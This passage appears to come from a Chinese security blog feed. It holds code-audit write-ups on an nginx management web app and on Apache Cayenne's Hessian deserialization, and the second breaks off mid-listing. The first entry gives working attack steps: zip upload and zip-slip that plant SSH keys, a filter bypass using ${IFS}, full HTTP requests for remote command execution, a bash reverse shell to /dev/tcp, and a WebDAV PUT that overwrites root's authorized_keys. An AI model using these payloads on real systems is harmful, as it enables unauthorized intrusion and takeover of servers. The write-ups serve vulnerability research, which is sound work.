alt="image-20240329100106111"></p><p>前端这里是限制了zip上传，但是我们看后端是没有判断的，直接会把上传的文件放到临时目录。</p><p><img src="image-20240329100312049.png" alt="image-20240329100312049"></p><p>当我们选择好目录时，他会调用</p><p>com.cym.controller.adminPage.WwwController#addOver进行处理</p><p><img src="image-20240329100458257.png" alt="image-20240329100458257"></p><p>可以看到，我们能控制解压目录，以及需要解压的文件，最后调用zip进行解压。</p><p>那么其实很简单了，TmpDir()我们知道，文件名知道，我们只需要上传一个ssh密钥到.ssh目录下就可以了。</p><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>先选择要上传的zip文件</p><p><img src="image-20240329100908051.png" alt="image-20240329100908051"></p><p><img src="image-20240329101000205.png" alt="image-20240329101000205"></p><p>可以看到以及上传到tmp目录，这是macos的，ubutu在**&#x2F;tmp**下</p><p><img src="image-20240528154401727.png" alt="image-20240528154401727"></p><p>选择好ssh目录。</p><p><img src="image-20240329101451560.png" alt="image-20240329101451560"></p><p>对应数据包。</p><p><img src="image-20240329101751292.png" alt="image-20240329101751292"></p><p>最后直接调用zip解压到ssh目录</p><p><img src="image-20240329101826366.png" alt="image-20240329101826366"></p><p>成功解压到ssh</p><p><img src="image-20240329102004582.png" alt="image-20240329102004582"></p><p>最后也是使用公钥直接登录</p><h2 id="0x02-zip目录穿越"><a href="#0x02-zip目录穿越" class="headerlink" title="0x02 zip目录穿越"></a>0x02 zip目录穿越</h2><p>上面那种方法，其实只能打一次，因为在zip解压的时候会在数据库查询，钥匙已经同目录穿过，会抛出异常。</p><p><img src="image-20240329103914323.png" alt="image-20240329103914323"></p><p>com.cym.controller.adminPage.WwwController#addOver</p><p><img src="image-20240329104044288.png" alt="image-20240329104044288"></p><p><img src="image-20240329104055165.png" alt="image-20240329104055165"></p><p><img src="image-20240329104110206.png" alt="image-20240329104110206"></p><p>这里可以清楚得看到，会在sql里面查询上传目录是否存在，存在就抛出异常。</p><p>这里有两种解决办法，第一种就是<img src="image-20240329104455283.png" alt="image-20240329104455283"></p><p>传入ssh的id，使其能正常修改目录的文件内容</p><p><img src="image-20240329104820562.png" alt="image-20240329104820562"></p><p>id可以直接f12获得，</p><p><img src="image-20240329105024339.png" alt="image-20240329105024339"></p><p>填入后就可以正常穿</p><p>第二种就比较暴力</p><p>cn.hutool.core.util.ZipUtil#unzip(java.util.zip.ZipFile, java.io.File, long)</p><p><img src="image-20240329105331535.png" alt="image-20240329105331535"></p><p>zipentry没有对..&#x2F;过滤。</p><p>zip解压时是没有对zip目录穿越进行过滤的，所以可以利用zip目录穿越来传文件，dir保证是没有使用过的就行。</p><h3 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h3><p>上传zip_slip.zip<img src="image-20240329110204537.png" alt="image-20240329110204537"></p><p><img src="image-20240329110244552.png" alt="image-20240329110244552"></p><p>得到路径</p><p><img src="image-20240329110338516.png" alt="image-20240329110338516"></p><p>上传时显示路径重复，这时我们dir任意写一个本地存在的目录，确保数据库没有就行。</p><p><img src="image-20240329110739896.png" alt="image-20240329110739896"></p><p>最后成功上传。</p><p><img src="image-20240329110828441.png" alt="image-20240329110828441"></p><p><img src="image-20240329110836847.png" alt="image-20240329110836847"></p><p>数据库里面的状态。</p><h2 id="0x03-runcmd绕过造成命令执行"><a href="#0x03-runcmd绕过造成命令执行" class="headerlink" title="0x03 runcmd绕过造成命令执行"></a>0x03 runcmd绕过造成命令执行</h2><p>com.cym.controller.adminPage.ConfController#runCmd</p><p><img src="image-20240329155921247.png" alt="image-20240329155921247"></p><p>可以看到穿进来的cmd先进行过滤，在进行拼接执行。</p><p>com.cym.controller.adminPage.ConfController#isAvailableCmd</p><p><img src="image-20240329160038310.png" alt="image-20240329160038310"></p><p><img src="image-20240329160044572.png" alt="image-20240329160044572"></p><p>可以先读取nginxPath、nginxExe、nginxDir三个值，首先判断在不在case里面，不在就进入if，主要就是判断cmd和<strong>settingService.get(“nginxExe”) + “ -c “ + settingService.get(“nginxPath”) + dir</strong>是不是想等，不想等就不执行，想等就执行</p><p>com.cym.controller.adminPage.ConfController#saveCmd</p><p><img src="image-20240329160352345.png" alt="image-20240329160352345"></p><p>而刚好这三个值我们可自由控制。</p><p><img src="image-20240329160433191.png" alt="image-20240329160433191"></p><p>它会对传值进行过滤，其实看看很好绕过。linux用$(IFS)代替空格就行，win用powershell.exe(calc) 就行</p><h3 id="复现-2"><a href="#复现-2" class="headerlink" title="复现"></a>复现</h3><p><img src="image-20240329161043497.png" alt="image-20240329161043497"></p><p>先修改两个值</p><p><img src="image-20240329161117706.png" alt="image-20240329161117706"></p><p>成功执行</p><p><img src="image-20240329161155744.png" alt="image-20240329161155744"></p><p><img src="image-20240329161204639.png" alt="image-20240329161204639"></p><p>可以执行。</p><p><img src="image-20240329220127636.png" alt="image-20240329220127636"></p><p>由于有过滤，所以我们可以把reserveshell写进文件，在用bash来执行就好。</p><p>利用前面分析得，上传点自动缓存到tem目录，ubuntu为&#x2F;tmp目录.。强烈建议不要用macos这傻逼每个shell环境里面var&#x2F;folders&#x2F;ln&#x2F;sjz_zm513ng125ngw6c2b_lm0000gn都不一样。</p><p><img src="image-20240329223018517.png" alt="image-20240329223018517"></p><p>换ubuntu后，成功rce</p><p><img src="image-20240329223111645.png" alt="image-20240329223111645"></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/adminPage/conf/saveCmd</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.108.137:8080<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>55<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json, text/javascript, */*; q=0.01<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://192.168.108.137:8080<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://192.168.108.137:8080/adminPage/conf<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>SOLONID=2dc9dd75ef4242f4a74bc855799539ec<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-dts">nginxE<span class="hljs-attr">xe</span><span class="hljs-operator">=</span>bash<span class="hljs-variable">&amp;</span>nginxD<span class="hljs-attr">ir</span><span class="hljs-operator">=</span><span class="hljs-variable">&amp;</span>nginxP<span class="hljs-attr">ath</span><span class="hljs-operator">=</span>$(bash$<span class="hljs-punctuation">&#123;</span>IFS<span class="hljs-punctuation">&#125;</span><span class="hljs-keyword">/tmp/</span><span class="hljs-number">111</span>)</span><br></code></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/adminPage/main/upload</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.108.137:8080<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>231<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json, text/javascript, */*; q=0.01<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundarygQGA2ci4A6Ii4KAG<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://192.168.108.137:8080<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://192.168.108.137:8080/adminPage/www<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>SOLONID=2dc9dd75ef4242f4a74bc855799539ec<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundarygQGA2ci4A6Ii4KAG</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;file&quot;; filename=&quot;111&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: <span class="hljs-type">text</span>/x-python-script</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">/bin/bash -i &gt;&amp; /dev/tcp/ip/<span class="hljs-number">9999</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span></span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundarygQGA2ci4A6Ii4KAG--</span></span><br><span class="language-pgsql"></span><br></code></pre></td></tr></table></figure><h2 id="0x04-reload-代码执行"><a href="#0x04-reload-代码执行" class="headerlink" title="0x04 reload 代码执行"></a>0x04 reload 代码执行</h2><p>com.cym.controller.adminPage.ConfController#reload</p><p><img src="image-20240330002357857.png" alt="image-20240330002357857"></p><p>没什么好说的，全可控，没有过滤。然后拼接，进行执行。</p><p>cn.hutool.core.util.RuntimeUtil#exec(java.lang.String…)</p><p><img src="image-20240330002434052.png" alt="image-20240330002434052"></p><p>最后会调用到这里，和上面不同，这里是代码执行</p><h3 id="复现-3"><a href="#复现-3" class="headerlink" title="复现"></a>复现</h3><p>生成java格式代码执行</p><p><img src="image-20240330002657116.png" alt="image-20240330002657116"></p><p><img src="image-20240330002622189.png" alt="image-20240330002622189"></p><p><img src="image-20240330002803528.png" alt="image-20240330002803528"></p><p><img src="image-20240330002630229.png" alt="image-20240330002630229"></p><p>成功获取shell</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/adminPage/conf/reload</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.108.137:8080<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>131<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json, text/javascript, */*; q=0.01<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://192.168.108.137:8080<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://192.168.108.137:8080/adminPage/conf<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>SOLONID=2dc9dd75ef4242f4a74bc855799539ec<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-dts">nginxP<span class="hljs-attr">ath</span><span class="hljs-operator">=</span><span class="hljs-variable">&amp;</span>nginxE<span class="hljs-attr">xe</span><span class="hljs-operator">=</span>cmd<span class="hljs-variable">&amp;</span>nginxD<span class="hljs-attr">ir</span><span class="hljs-operator">=</span></span><br></code></pre></td></tr></table></figure><h2 id="0x05-check-代码执行"><a href="#0x05-check-代码执行" class="headerlink" title="0x05 check 代码执行"></a>0x05 check 代码执行</h2><p>com.cym.controller.adminPage.ConfController#check</p><p><img src="image-20240330003342822.png" alt="image-20240330003342822"></p><p>同理，全可控，且没过滤</p><p>最后会走到execforstr(),然后造成代码执行</p><p><img src="image-20240330003420470.png" alt="image-20240330003420470"></p><p><img src="image-20240330003524958.png" alt="image-20240330003524958"></p><p>我们只需要对nginxExe赋值就行，json保持默认，其余不填即可</p><h3 id="复现-4"><a href="#复现-4" class="headerlink" title="复现"></a>复现</h3><p><img src="image-20240330002657116.png" alt="image-20240330002657116"></p><p>生成java反弹payload</p><p><img src="image-20240330003729310.png" alt="image-20240330003729310"></p><p>成功rce</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/adminPage/conf/check</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.108.137:8080<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>495<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json, text/javascript, */*; q=0.01<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://192.168.108.137:8080<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://192.168.108.137:8080/adminPage/conf<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>SOLONID=2dc9dd75ef4242f4a74bc855799539ec<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-ini"><span class="hljs-attr">nginxPath</span>=&amp;nginxExe=bash+-c+cmd</span><br></code></pre></td></tr></table></figure><h2 id="0x06-利用nginx—conf配置rce"><a href="#0x06-利用nginx—conf配置rce" class="headerlink" title="0x06  利用nginx—conf配置rce"></a>0x06  利用nginx—conf配置rce</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell">user  root;<br>worker_processes 4;<br>pid /tmp/nginx.pid;<br><br>events &#123;<br>    worker_connections 768;<br>&#125;<br><br>http &#123;<br>    server &#123;<br>        listen 1337;<br>        root /;<br>        autoindex on;<br>    <br>        location / &#123;<br>            dav_methods PUT;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="image-20240417215333266.png" alt="image-20240417215333266"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl -X PUT -T ~/Downloads/authorized_keys  http://192.168.108.137:1337/root/.ssh/authorized_keys<br></code></pre></td></tr></table></figure><p><img src="image-20240417215410337.png" alt="image-20240417215410337"></p><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>此文章 仅用于教育目的。请负责任地使用它，并且仅在您有明确测试权限的系统上使用。滥用此 PoC 可能会导致严重后果。</p>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>apache-cayenne代码审计</title>
    <link href="/2024/03/01/apache-cayenne%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <url>/2024/03/01/apache-cayenne%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<p>首发于先知<a href="http://xz.aliyun.com/t/13990">http://xz.aliyun.com/t/13990</a></p><h3 id="0x01-起因"><a href="#0x01-起因" class="headerlink" title="0x01 起因"></a>0x01 起因</h3><p>​去年年底学了学hessian协议，Umbrella师傅推荐了几套代码，其中就选择sofa-rpc、dobbo-admin、cayenne等代码。其中过年前，审计了sofa-rpc，奈何大佬已经交过cve，成了1。（估计参考：<a href="http://xz.aliyun.com/t/13462%EF%BC%89%E7%8E%B0%E5%9C%A8%E5%B9%B4%E5%90%8E%EF%BC%8C%E5%A4%A9%E5%A4%A9%E5%9C%A8%E5%B8%AE%E5%AE%A2%E6%88%B7%E6%8C%96cnvd%EF%BC%8C%E5%9B%A4%E4%BA%86%E7%82%B9%E5%BA%93%E5%AD%98%EF%BC%8C%E6%89%80%E4%BB%A5%E6%8D%A1%E8%B5%B7%E6%9D%A5%E7%BB%A7%E7%BB%AD%E5%AE%A1%E8%AE%A1cayenne%E3%80%82">http://xz.aliyun.com/t/13462）现在年后，天天在帮客户挖cnvd，囤了点库存，所以捡起来继续审计cayenne。</a></p><p>​Apache Cayenne是一个开源的Java持久化框架，用于简化与关系型数据库的交互。它提供了对象关系映射（ORM）功能，将数据库表映射为Java对象，使开发人员可以使用面向对象的方式进行数据库操作。Cayenne支持各种主流数据库，并提供了强大的查询引擎和可视化工具，帮助开发人员更轻松地管理数据模型和构建查询。它具有简单易用、灵活可扩展的特点，适用于构建数据驱动的应用程序。</p><h3 id="0x02-审计"><a href="#0x02-审计" class="headerlink" title="0x02 审计"></a>0x02 审计</h3><p>​直接开审</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs leaf">org.apache.cayenne.rop.HessianROPSerializationService<span class="hljs-punctuation">#</span><span class="hljs-keyword">HessianROPSerializationService</span><span class="hljs-params">(<span class="hljs-variable">com</span>.<span class="hljs-variable">caucho</span>.<span class="hljs-variable">hessian</span>.<span class="hljs-variable">io</span>.<span class="hljs-variable">SerializerFactory</span>)</span><br></code></pre></td></tr></table></figure><p><img src="image-20240301124557180.png" alt="image-20240301124557180"></p><p>​可以看到就是调用了hessian进行序列化。</p><p><img src="image-20240301124653492.png" alt="image-20240301124653492"></p><p>用的也是原版hessian，那么只需要找传入点就可以了。</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs leaf">org.apache.cayenne.rop.ROPServlet<span class="hljs-punctuation">#</span><span class="hljs-keyword">doPost</span><span class="hljs-params">()</span><br></code></pre></td></tr></table></figure><p><img src="image-20240301124911447.png" alt="image-20240301124911447"></p><p>这里也是非常标准的直接从req获取流。</p><p>所以，马上就启动了server，直接用项目自带列子。</p><p><img src="image-20240301125126266.png" alt="image-20240301125126266"></p><p><img src="image-20240301125605018.png" alt="image-20240301125605018"></p><p>非常短的一条链子。</p><p>当然，结果也是轻松翻车。</p><p><img src="image-20240301125704421.png" alt="image-20240301125704421"></p><p>但是看调用是成功走到了的。</p><p>说实话，这里是坑了我很久，觉得没有问题，直接调用类的函数也能rce。最后发现，我下载的最新版4.2，这个点已经被交cve了，很早就修复了，漏洞版本设计到4.1以前。</p><p><img src="image-20240301130029436.png" alt="image-20240301130029436"></p><p>显示直接开启的白名单，直接属于焊死了。所以，以后还得继续看历史漏洞，别浪费精力水cve。</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs leaf">org.apache.cayenne.remote.hessian.HessianConfig<span class="hljs-punctuation">#</span><span class="hljs-keyword">createFactory</span><span class="hljs-params">(<span class="hljs-variable">java</span>.<span class="hljs-variable">lang</span>.<span class="hljs-variable">String</span>[], <span class="hljs-variable">org</span>.<span class="hljs-variable">apache</span>.<span class="hljs-variable">cayenne</span>.<span class="hljs-variable">map</span>.<span class="hljs-variable">EntityResolver</span>, <span class="hljs-variable">java</span>.<span class="hljs-variable">util</span>.<span class="hljs-variable">Collection</span><span class="hljs-operator">&lt;</span><span class="hljs-variable">java</span>.<span class="hljs-variable">lang</span>.<span class="hljs-variable">String</span><span class="hljs-operator">&gt;</span>)</span><br></code></pre></td></tr></table></figure><p><img src="image-20240301130357840.png" alt="image-20240301130357840"></p><p>这里可以看见，默认只允许<strong>org.apache.cayenne.</strong>*</p><p>然后根据传的白名单添加白名单。</p><p>往上跟</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.cayenne</span><span class="hljs-selector-class">.rop</span>.ServerHessianSerializationServiceProvider<br></code></pre></td></tr></table></figure><p><img src="image-20240301131035805.png" alt="image-20240301131035805"></p><p>这里看到，启动server是默认初始化白明单就是null。也就是没得玩了。</p><p><img src="image-20240301135941597.png" alt="image-20240301135941597"></p><p>修改，不要检查白名单，重打包。</p><p><img src="image-20240301140053616.png" alt="image-20240301140053616"></p><p>再次运行，成功rce。也就是影响4.1及以前版本。</p><h3 id="0x03-exp"><a href="#0x03-exp" class="headerlink" title="0x03 exp"></a>0x03 exp</h3><p>一个不会用Jodi的exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java">getDefaultPrinterNameBSD:<span class="hljs-number">752</span>, UnixPrintServiceLookup (sun.print)<br>getDefaultPrintService:<span class="hljs-number">663</span>, UnixPrintServiceLookup (sun.print)<br>invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">497</span>, Method (java.lang.reflect)<br>invoke:<span class="hljs-number">71</span>, Trampoline (sun.reflect.misc)<br>invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">497</span>, Method (java.lang.reflect)<br>invoke:<span class="hljs-number">275</span>, MethodUtil (sun.reflect.misc)<br>invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">497</span>, Method (java.lang.reflect)<br>invoke:<span class="hljs-number">71</span>, Trampoline (sun.reflect.misc)<br>invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">497</span>, Method (java.lang.reflect)<br>invoke:<span class="hljs-number">275</span>, MethodUtil (sun.reflect.misc)<br>invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">497</span>, Method (java.lang.reflect)<br>createValue:<span class="hljs-number">73</span>, SwingLazyValue (sun.swing)<br>getFromHashtable:<span class="hljs-number">216</span>, UIDefaults (javax.swing)<br>get:<span class="hljs-number">161</span>, UIDefaults (javax.swing)<br>equals:<span class="hljs-number">813</span>, Hashtable (java.util)<br>putVal:<span class="hljs-number">634</span>, HashMap (java.util)<br>put:<span class="hljs-number">611</span>, HashMap (java.util)<br>readMap:<span class="hljs-number">114</span>, MapDeserializer (com.caucho.hessian.io)<br>readMap:<span class="hljs-number">577</span>, SerializerFactory (com.caucho.hessian.io)<br>readObject:<span class="hljs-number">1160</span>, HessianInput (com.caucho.hessian.io)<br>deserialize:<span class="hljs-number">74</span>, HessianROPSerializationService (org.apache.cayenne.rop)<br>main:<span class="hljs-number">90</span>, exp (org.apache.cayenne.tutorial.persistent)<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span 